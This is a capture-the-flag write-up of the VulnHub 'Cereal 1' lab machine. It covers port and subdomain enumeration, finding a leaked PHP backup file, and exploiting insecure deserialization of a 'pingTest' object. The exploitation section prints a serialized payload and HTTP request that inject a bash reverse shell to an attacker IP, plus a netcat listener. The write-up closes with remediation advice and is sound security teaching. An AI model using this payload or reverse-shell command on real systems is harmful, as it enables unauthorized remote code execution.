# VulnHub Cereal Machine Writeup

## Machine Information

- **Platform**: VulnHub
- **Machine Name**: Cereal 1
- **Target IP**: 192.168.56.103
- **Operating System**: Linux
- **Difficulty**: Hard
- **Attack Vector**: PHP Deserialization

## Executive Summary

This writeup documents the exploitation of the Cereal machine from VulnHub, which features a PHP deserialization vulnerability. The attack path involved network reconnaissance, subdomain enumeration, source code analysis, and exploiting an insecure deserialization implementation to achieve remote code execution. This machine demonstrates the critical security risks associated with trusting user-controlled serialized data without proper validation.

## Machine Description

According to the author, this machine is designed to be more realistic and less CTF-like compared to traditional challenges. It focuses on teaching advanced concepts and is specifically noted as being difficult, requiring patience and thorough environment analysis after gaining initial access.

## Reconnaissance

### Network Discovery

Initial network reconnaissance was performed to identify the target machine within the local network.

```bash
arp-scan -I enp0s8 --localnet --ignoredups
```

**Target IP Identified**: 192.168.56.103

Setting up the target for systematic analysis:

```bash
settarget "Cereal 192.168.56.103"
```

### Port Scanning

Comprehensive port scanning was conducted to identify all open services on the target machine.

```bash
nmap -sS -Pn -n -p- --min-rate 5000 192.168.56.103
```

**Open Ports Discovered**:

![Port Scan Results](Pasted%20image%2020250802165114.png)

### Service Enumeration

Detailed service enumeration was performed on the discovered open ports:

```bash
nmap -sCV -Pn -n -p21,22,80,139,445,3306,11111,22222,33333,44441,44444,55551,55555 192.168.56.103 -oN targetPorts
```

**Key Services Identified**:

- **Port 21**: FTP service
- **Port 22**: SSH service
- **Port 80**: HTTP web server
- **Port 44441**: Secondary HTTP service
- **Port 3306**: MySQL database
- **Various high ports**: Additional services

![Service Enumeration](Pasted%20image%2020250802165934.png)

The analysis focused primarily on the web services running on ports 80 and 44441.

## Web Application Analysis

### Directory Discovery

Web directory enumeration was performed to identify potential attack vectors:

```bash
gobuster dir -w /home/xon/Desktop/xon/SecLists/Fuzzing/fuzz-Bo0oM.txt -u http://192.168.56.103 -t 20
```

**Interesting directories discovered**:

![Directory Discovery](/Pasted%20image%2020250802170531.png)

### WordPress Identification

Investigation of the discovered paths revealed a WordPress installation on the blog directory. However, the site was using virtual hosting, causing styling issues.

![WordPress Site Issues](Pasted%20image%2020250802170953.png)

**Virtual Host Configuration**: Added `cereal.ctf` to `/etc/hosts` to resolve the virtual hosting issue and properly load the website styling.

### Subdomain Discovery

Subdomain enumeration was performed on the secondary web service:

```bash
gobuster vhost -u http://cereal.ctf:44441/ -w /home/xon/Desktop/xon/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
```

**Subdomain Discovered**: `secure.cereal.ctf`

After adding the subdomain to `/etc/hosts`, accessing the subdomain revealed a ping utility interface:

![Secure Subdomain Interface](Pasted%20image%2020250802173741.png)

## Vulnerability Analysis

### Ping Functionality Testing

The web application appeared to provide a ping utility. To verify its functionality, network monitoring was established:

**Monitoring Setup**:

```bash
tcpdump -i enp0s8 icmp -n
```

![Network Monitoring](Pasted%20image%2020250802174317.png)

**Ping Test from Web Interface**:

![Web Ping Test](Pasted%20image%2020250802174258.png)

### HTTP Request Analysis

Using Burp Suite to intercept and analyze the HTTP requests revealed the underlying mechanism:

```javascript
POST / HTTP/1.1
Host: secure.cereal.ctf:44441
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://secure.cereal.ctf:44441/
Content-Type: application/x-www-form-urlencoded
Content-Length: 104
Origin: http://secure.cereal.ctf:44441
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i

obj=O%3A8%3A%22pingTest%22%3A1%3A%7Bs%3A9%3A%22ipAddress%22%3Bs%3A9%3A%22127.0.0.1%22%3B%7D&ip=127.0.0.1
```

**Key Observation**: The request contains a URL-encoded serialized PHP object: `obj=O:8:"pingTest":1:{s:9:"ipAddress";s:9:"127.0.0.1";}`

This indicates that the server is deserializing user-controlled data, which presents a significant security vulnerability.

### Source Code Discovery

Further directory enumeration on the secure subdomain revealed additional attack surface:

```bash
gobuster dir -w /home/xon/Desktop/xon/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://secure.cereal.ctf:44441/ -t 20
```

The `/back_en` directory was discovered but access was denied. Extended enumeration with file extensions was performed:

```bash
gobuster dir -w /home/xon/Desktop/xon/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://secure.cereal.ctf:44441/back_en/ -t 20 -x php,html,htm,js,asp,aspx,jsp,txt,xml,json,config,bak,log
```

**Critical Discovery**: `http://secure.cereal.ctf:44441/back_en/index.php.bak`

![Backup File Discovery](Pasted%20image%2020250802181638.png)

### Source Code Analysis

The backup file contained the complete source code of the application, revealing the deserialization vulnerability:

![Source Code Analysis](Pasted%20image%2020250802182515.png)

**Code Structure Analysis**:

1. **Class Definition**: `pingTest` class with properties for IP address, validity flag, and output
2. **Validation Method**: `validate()` function checks IP validity before executing ping
3. **Ping Execution**: `ping()` method executes system ping command
4. **Deserialization**: User-controlled `$_POST['obj']` is directly deserialized
5. **Execution Flow**: Deserialized object's `validate()` method is called

**Vulnerability Assessment**: The application blindly trusts user input and deserializes it without any validation, allowing for object manipulation and potential code execution.

## Exploitation

### Payload Development

The vulnerability can be exploited by crafting a malicious serialized object that bypasses the validation checks:

![Payload Development](Pasted%20image%2020250802183526.png)

**Exploit Strategy**:

1. Create a malicious `pingTest` object with a reverse shell payload in the `ipAddress` field
2. Set the `isValid` property to `true` to bypass validation
3. Serialize and URL-encode the malicious object

### Payload Serialization

The malicious object was serialized using a custom PHP script:

```bash
php serialize.php; echo
```

**Serialized Payload Output**:

```
O%3A8%3A%22pingTest%22%3A3%3A%7Bs%3A9%3A%22ipAddress%22%3Bs%3A55%3A%22%3B+bash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.56.102%2F443+0%3E%261%27%22%3Bs%3A7%3A%22isValid%22%3Bb%3A1%3Bs%3A6%3A%22output%22%3Bs%3A0%3A%22%22%3B%7D
```

### Exploit Execution

The malicious payload was delivered through the following HTTP request:

```json
POST / HTTP/1.1
Host: secure.cereal.ctf:44441
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://secure.cereal.ctf:44441/
Content-Type: application/x-www-form-urlencoded
Content-Length: 104
Origin: http://secure.cereal.ctf:44441
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i

obj=O%3A8%3A%22pingTest%22%3A3%3A%7Bs%3A9%3A%22ipAddress%22%3Bs%3A55%3A%22%3B+bash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.56.102%2F443+0%3E%261%27%22%3Bs%3A7%3A%22isValid%22%3Bb%3A1%3Bs%3A6%3A%22output%22%3Bs%3A0%3A%22%22%3B%7D&ip=127.0.0.1
```

### Reverse Shell Establishment

A netcat listener was established to receive the reverse shell connection:

```bash
nc -nlvp 443
```

**Successful Exploitation**:

![Reverse Shell Success](Pasted%20image%2020250802184513.png)

The exploit successfully bypassed the validation mechanisms and established a reverse shell connection, demonstrating complete remote code execution.

## Technical Analysis

### Vulnerability Details

**CVE Category**: CWE-502 (Deserialization Vulnerability)

**Root Cause**: The application directly deserializes user-controlled input without any validation or sanitization.

**Attack Vector**: By manipulating the serialized object properties, an attacker can:

1. Set the `isValid` flag to `true` to bypass IP validation
2. Inject malicious commands in the `ipAddress` field
3. Achieve command execution through the ping functionality

### Security Impact

1. **Remote Code Execution**: Complete system compromise through command injection
2. **Data Confidentiality**: Potential access to sensitive system and application data
3. **System Integrity**: Ability to modify system files and configurations
4. **Service Availability**: Potential for denial of service attacks

## Remediation Recommendations

### Immediate Actions

1. **Input Validation**: Implement strict validation for all user inputs before deserialization
2. **Whitelist Approach**: Use a whitelist of allowed classes for deserialization
3. **Sanitization**: Properly sanitize and validate IP addresses before system command execution
4. **Remove Backup Files**: Ensure backup files are not accessible from web directories

### Long-term Security Improvements

1. **Secure Coding Practices**: Avoid deserializing user-controlled data
2. **Code Review**: Implement regular security code reviews
3. **Input Validation Framework**: Use established libraries for input validation
4. **Least Privilege**: Run web applications with minimal required privileges
5. **Security Testing**: Implement regular penetration testing and vulnerability assessments

### Development Best Practices

1. **Parameterized Commands**: Use parameterized commands instead of string concatenation
2. **Object Signing**: Implement cryptographic signing for serialized objects
3. **Error Handling**: Implement proper error handling without information disclosure
4. **Security Headers**: Implement appropriate security headers

## Conclusion

This penetration test successfully demonstrated a critical PHP deserialization vulnerability in the Cereal VulnHub machine. The attack highlighted the severe security risks associated with trusting user-controlled serialized data. The exploitation achieved complete remote code execution by manipulating object properties to bypass validation mechanisms.

The key lesson from this exercise is that applications should never trust user input, especially when dealing with serialization and deserialization processes. This vulnerability could have been prevented through proper input validation, avoiding deserialization of user-controlled data, and implementing secure coding practices.

This machine serves as an excellent educational example of how seemingly simple functionality can hide critical security vulnerabilities when proper security controls are not implemented.
